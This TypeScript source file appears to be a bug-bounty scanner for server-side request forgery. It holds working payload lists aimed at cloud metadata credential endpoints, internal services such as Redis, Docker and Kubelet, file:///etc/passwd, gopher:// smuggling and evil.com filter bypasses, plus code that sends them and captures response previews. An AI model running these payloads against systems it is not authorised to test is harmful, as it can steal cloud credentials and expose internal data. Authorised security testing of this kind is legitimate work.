#!/usr/bin/env node --import tsx
/**
 * ssrf-scan — Server-Side Request Forgery detector.
 *
 * Average payout: $10K-$25K. Rising trend. Highly automatable.
 *
 * Tests whether a target endpoint can be tricked into making requests
 * to internal services, cloud metadata endpoints, or arbitrary URLs.
 *
 * Strategies:
 * 1. Parameter injection — inject internal URLs into URL/redirect params
 * 2. Cloud metadata probes — try AWS/GCP/Azure metadata endpoints
 * 3. DNS rebinding detection — detect if server resolves DNS differently
 * 4. Protocol smuggling — try file://, dict://, gopher:// schemes
 *
 * Usage:
 *   node --import tsx tools/ssrf-scan.ts '{
 *     "target_url": "https://api.example.com/fetch",
 *     "param_name": "url",
 *     "method": "POST",
 *     "auth_token": "Bearer xxx",
 *     "callback_url": "https://your-burp-collaborator.oastify.com"
 *   }'
 */

import { probe, type ProbeResponse } from "./http-probe.js";
import { validateUrl, validateRequired, Tracer, sleep } from "./tool-utils.js";

type SSRFConfig = {
  target_url: string;
  param_name: string; // parameter to inject into (url, redirect, file, path, etc.)
  param_location?: "query" | "body" | "header"; // where the param goes (default: query)
  method?: string;
  auth_token?: string;
  cookies?: string;
  headers?: Record<string, string>;
  callback_url?: string; // external collaborator URL to detect blind SSRF
  extra_payloads?: string[]; // custom payloads to test
  delay_ms?: number;
};

type SSRFFinding = {
  payload: string;
  category: string;
  status: number;
  body_length: number;
  body_preview: string;
  timing_ms: number;
  evidence: string;
  severity: "critical" | "high" | "medium" | "low";
};

type SSRFResult = {
  target: string;
  param: string;
  total_tested: number;
  baseline: { status: number; body_length: number; timing_ms: number };
  findings: SSRFFinding[];
  summary: string;
};

// Cloud metadata endpoints
const CLOUD_METADATA = [
  // AWS IMDSv1
  { url: "http://169.254.169.254/latest/meta-data/", label: "AWS IMDSv1 metadata" },
  {
    url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    label: "AWS IAM credentials",
  },
  { url: "http://169.254.169.254/latest/user-data/", label: "AWS user-data" },
  // AWS IMDSv2 (won't work without token header, but worth testing)
  { url: "http://169.254.169.254/latest/api/token", label: "AWS IMDSv2 token" },
  // GCP
  { url: "http://metadata.google.internal/computeMetadata/v1/", label: "GCP metadata" },
  {
    url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    label: "GCP service account token",
  },
  // Azure
  { url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", label: "Azure IMDS" },
  {
    url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    label: "Azure managed identity token",
  },
  // DigitalOcean
  { url: "http://169.254.169.254/metadata/v1/", label: "DigitalOcean metadata" },
  // Alibaba
  { url: "http://100.100.100.200/latest/meta-data/", label: "Alibaba Cloud metadata" },
];

// Internal network probes
const INTERNAL_PROBES = [
  { url: "http://localhost/", label: "localhost" },
  { url: "http://localhost:8080/", label: "localhost:8080" },
  { url: "http://localhost:3000/", label: "localhost:3000" },
  { url: "http://localhost:9200/", label: "Elasticsearch" },
  { url: "http://localhost:6379/", label: "Redis" },
  { url: "http://localhost:27017/", label: "MongoDB" },
  { url: "http://localhost:5432/", label: "PostgreSQL" },
  { url: "http://localhost:8500/v1/agent/self", label: "Consul" },
  { url: "http://127.0.0.1:2375/version", label: "Docker API" },
  { url: "http://127.0.0.1:10250/pods", label: "Kubelet API" },
  { url: "http://[::1]/", label: "IPv6 localhost" },
  { url: "http://0.0.0.0/", label: "0.0.0.0" },
  { url: "http://0177.0.0.1/", label: "Octal localhost" },
  { url: "http://0x7f000001/", label: "Hex localhost" },
  { url: "http://2130706433/", label: "Decimal localhost" },
  { url: "http://127.1/", label: "Short localhost" },
];

// Bypass techniques
const BYPASS_PAYLOADS = [
  // URL encoding
  { url: "http://127.0.0.1%00@evil.com/", label: "Null byte in URL" },
  { url: "http://evil.com@127.0.0.1/", label: "Credential confusion" },
  { url: "http://127.0.0.1#@evil.com/", label: "Fragment confusion" },
  // Protocol smuggling
  { url: "file:///etc/passwd", label: "file:// protocol" },
  { url: "file:///etc/hostname", label: "file:// hostname" },
  { url: "dict://localhost:6379/info", label: "dict:// Redis" },
  { url: "gopher://localhost:6379/_INFO%0d%0a", label: "gopher:// Redis" },
  // DNS tricks
  { url: "http://localtest.me/", label: "localtest.me (resolves to 127.0.0.1)" },
  { url: "http://spoofed.burpcollaborator.net/", label: "Burp DNS rebinding" },
  { url: "http://nip.io/", label: "nip.io wildcard DNS" },
  { url: "http://127.0.0.1.nip.io/", label: "127.0.0.1 via nip.io" },
  // Redirect chains
  {
    url: "https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/",
    label: "Redirect to AWS metadata",
  },
];

function buildRequestWithPayload(
  config: SSRFConfig,
  payloadUrl: string,
): { url: string; body?: Record<string, unknown> } {
  const location = config.param_location ?? "query";

  if (location === "query") {
    const u = new URL(config.target_url);
    u.searchParams.set(config.param_name, payloadUrl);
    return { url: u.toString() };
  }
  if (location === "body") {
    return {
      url: config.target_url,
      body: { [config.param_name]: payloadUrl },
    };
  }
  // header — handled separately
  return { url: config.target_url };
}

async function testPayload(
  config: SSRFConfig,
  payload: { url: string; label: string },
  baseline: { status: number; body_length: number; timing_ms: number },
  category: string,
): Promise<SSRFFinding | null> {
  const { url, body } = buildRequestWithPayload(config, payload.url);

  const headers: Record<string, string> = { ...config.headers };
  if (config.auth_token) {
    headers["Authorization"] = config.auth_token.startsWith("Bearer ")
      ? config.auth_token
      : `Bearer ${config.auth_token}`;
  }
  if (config.param_location === "header") {
    headers[config.param_name] = payload.url;
  }

  const resp = await probe({
    url,
    method: config.method ?? "GET",
    headers,
    cookies: config.cookies,
    body,
    follow_redirects: true,
    timeout_ms: 10000,
  });

  // Detect SSRF indicators
  const indicators: string[] = [];

  // Different response than baseline = server processed the URL differently
  if (resp.status !== baseline.status) {
    indicators.push(`status changed: ${baseline.status} → ${resp.status}`);
  }
  if (Math.abs(resp.body_length - baseline.body_length) > 50) {
    indicators.push(`body size changed: ${baseline.body_length} → ${resp.body_length}`);
  }
  if (resp.timing_ms > baseline.timing_ms * 3) {
    indicators.push(`timing spike: ${baseline.timing_ms}ms → ${resp.timing_ms}ms`);
  }

  // Check for cloud metadata content in response
  const metadataSignals = [
    "ami-id",
    "instance-id",
    "security-credentials",
    "computeMetadata",
    "access_token",
    "client_email",
    "subscriptionId",
    "vmId",
    "root:x:0:0",
    "docker",
    "kubelet",
    "consul",
  ];
  for (const signal of metadataSignals) {
    if (resp.body.toLowerCase().includes(signal.toLowerCase())) {
      indicators.push(`metadata signal in response: "${signal}"`);
    }
  }

  // 200 on internal URL = likely SSRF
  if (resp.status >= 200 && resp.status < 300 && category !== "baseline") {
    if (
      payload.url.includes("169.254") ||
      payload.url.includes("metadata") ||
      payload.url.includes("localhost") ||
      payload.url.includes("127.0.0.1") ||
      payload.url.includes("file://") ||
      payload.url.includes("gopher://")
    ) {
      indicators.push(`200 OK on internal/metadata URL`);
    }
  }

  if (indicators.length === 0) {
    return null;
  }

  let severity: SSRFFinding["severity"] = "low";
  if (
    indicators.some(
      (i) =>
        i.includes("metadata signal") ||
        i.includes("access_token") ||
        i.includes("security-credentials"),
    )
  ) {
    severity = "critical";
  } else if (indicators.some((i) => i.includes("200 OK on internal"))) {
    severity = "high";
  } else if (
    indicators.some((i) => i.includes("status changed") || i.includes("body size changed"))
  ) {
    severity = "medium";
  }

  return {
    payload: payload.url,
    category,
    status: resp.status,
    body_length: resp.body_length,
    body_preview: resp.body.slice(0, 500),
    timing_ms: resp.timing_ms,
    evidence: indicators.join("; "),
    severity,
  };
}

async function scanSSRF(config: SSRFConfig): Promise<SSRFResult> {
  // --- Input validation ---
  validateRequired(config as unknown as Record<string, unknown>, ["target_url", "param_name"]);
  validateUrl(config.target_url, "target_url");

  const tracer = new Tracer("ssrf-scan");
  tracer.log("start", { target: config.target_url, param: config.param_name });

  const delay = config.delay_ms ?? 200;
  const method = config.method ?? "GET";

  // Step 1: Baseline — send a benign URL
  const baselineReq = buildRequestWithPayload(config, "https://httpbin.org/get");
  const headers: Record<string, string> = { ...config.headers };
  if (config.auth_token) {
    headers["Authorization"] = config.auth_token.startsWith("Bearer ")
      ? config.auth_token
      : `Bearer ${config.auth_token}`;
  }

  const baselineResp = await probe({
    url: baselineReq.url,
    method,
    headers,
    cookies: config.cookies,
    body: baselineReq.body,
  });

  const baseline = {
    status: baselineResp.status,
    body_length: baselineResp.body_length,
    timing_ms: baselineResp.timing_ms,
  };

  const result: SSRFResult = {
    target: config.target_url,
    param: config.param_name,
    total_tested: 0,
    baseline,
    findings: [],
    summary: "",
  };

  // Build payload list
  const allPayloads: { url: string; label: string; category: string }[] = [];

  for (const p of CLOUD_METADATA) {
    allPayloads.push({ ...p, category: "cloud_metadata" });
  }
  for (const p of INTERNAL_PROBES) {
    allPayloads.push({ ...p, category: "internal_network" });
  }
  for (const p of BYPASS_PAYLOADS) {
    allPayloads.push({ ...p, category: "bypass" });
  }

  // Add callback URL if provided (for blind SSRF)
  if (config.callback_url) {
    allPayloads.push({
      url: config.callback_url,
      label: "Blind SSRF callback",
      category: "blind_ssrf",
    });
    allPayloads.push({
      url: `${config.callback_url}/${Date.now()}`,
      label: "Blind SSRF callback with timestamp",
      category: "blind_ssrf",
    });
  }

  // Add custom payloads
  if (config.extra_payloads) {
    for (const p of config.extra_payloads) {
      allPayloads.push({ url: p, label: "Custom payload", category: "custom" });
    }
  }

  // Test each payload
  for (const payload of allPayloads) {
    result.total_tested++;
    const finding = await testPayload(config, payload, baseline, payload.category);
    if (finding) {
      result.findings.push(finding);
    }
    if (delay > 0) {
      await sleep(delay);
    }
  }

  const critCount = result.findings.filter((f) => f.severity === "critical").length;
  const highCount = result.findings.filter((f) => f.severity === "high").length;
  result.summary =
    result.findings.length === 0
      ? `No SSRF indicators found. Tested ${result.total_tested} payloads.`
      : `FOUND ${result.findings.length} SSRF indicator(s): ${critCount} critical, ${highCount} high. Tested ${result.total_tested} payloads. Check callback URL for blind SSRF.`;

  tracer.log("complete", { findings: result.findings.length, total_tested: result.total_tested });
  (result as Record<string, unknown>)._trace = tracer.summary();

  return result;
}

// --- CLI entry ---
if (process.argv[1]?.includes("ssrf-scan")) {
  const input = process.argv[2];
  if (!input) {
    console.log(
      JSON.stringify({
        error: 'Usage: ssrf-scan \'{"target_url":"...", "param_name":"url", ...}\'',
        params: [
          "target_url (required) — endpoint that fetches URLs",
          "param_name (required) — parameter name that accepts URLs",
          "param_location (query|body|header, default query)",
          "method (GET|POST, default GET)",
          "auth_token — Bearer token",
          "cookies — cookie header",
          "headers (object) — additional headers",
          "callback_url — Burp Collaborator / interact.sh URL for blind SSRF",
          "extra_payloads (string[]) — custom URLs to test",
          "delay_ms (number, default 200)",
        ],
      }),
    );
    process.exit(1);
  }
  const config: SSRFConfig = JSON.parse(input);
  scanSSRF(config).then((r) => console.log(JSON.stringify(r, null, 2)));
}

export { scanSSRF, type SSRFConfig, type SSRFResult };
